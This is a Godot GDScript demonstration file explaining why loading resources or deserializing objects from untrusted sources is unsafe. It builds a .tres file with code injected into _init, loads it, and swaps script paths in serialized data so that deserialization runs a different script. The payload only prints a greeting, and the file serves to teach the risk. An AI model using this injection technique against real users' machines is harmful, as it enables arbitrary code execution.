extends Control

@export var bad_resource: Resource

func _ready():
	why_var_to_bytes_is_unsafe()
	why_resourcesaver_is_unsafe()
	await get_tree().create_timer(1).timeout
	get_tree().quit()
	
	
func why_resourcesaver_is_unsafe():
	# Long story short, you can inject arbitrary code in a resource and have it run.
	# See https://www.youtube.com/watch?v=j7p7cGj20jU, but here's an example of how to create a hacked .tres
	
	
	var unsafe = TestResourceUnsafe.new()
	# By bundling external resources I can bundle the source here.
	var e: Error = ResourceSaver.save(unsafe, "user://unsafe.tres", ResourceSaver.FLAG_BUNDLE_RESOURCES)
	
	# Rename the class so it runs instead of creating a conflict with the existing class. 
	var f = FileAccess.open("user://unsafe.tres", FileAccess.READ_WRITE)
	var content = f.get_as_text()
	content = content.replace("TestResourceUnsafe", "TestResourceHacked")
	# Also, I can inject whatever code I want.
	var orig: String = "func _init():"
	var inject: String = "func _init():\n\tprint(\\\"Hello there.\\\", \\\"General Kenobi\\\")\n"
	content = content.replace(orig, inject)
	f.seek(0)
	f.store_string(content)
	f.close()
	print(content)
	
	# If I send you unsafe.tres and you load it with ResourceLoader.load, I can pwn your machine.
	var unsafe2 = ResourceLoader.load("user://unsafe.tres")
	
	
func why_var_to_bytes_is_unsafe():
	var t = TestForm.new()
	var s: Script = t.get_script()
	
	# var_to_bytes_with_objects will only encode scripts with a custom path that starts with "res://". 
	# So you're safe from injecting source code directly into the data.
	print("Attacking var_to_bytes_with_objects:")
	var s2: Script = GDScript.new()
	s2.source_code = s.source_code
	t.set_script(s2)
	var vtb = var_to_bytes_with_objects(t) 
	print("hack should fail: ", vtb)
	var vts = var_to_str(t)
	print("hack should succeed?: ", vts)
	
	# BUT, an attacker can change the script path somewhere in the serialization/deserialization path.
	print("Attacking var_to_bytes_with_objects:")
	t.set_script(TestFormUnsafe)
	vtb = var_to_bytes_with_objects(t) 
	print("hack should succeed:", vtb)
	var t2 = bytes_to_var_with_objects(vtb)
	print(t2)
	
	# It's even easier for an attacker to change the plaintext generated by var_to_str
	print("Attacking var_to_str:")
	t = TestForm.new()
	vts = var_to_str(t)
	print(vts)
	vts = vts.replace("testform.gd", "testform_unsafe.gd")
	print(vts)
	t2 = str_to_var(vts)
	print(t2)
	
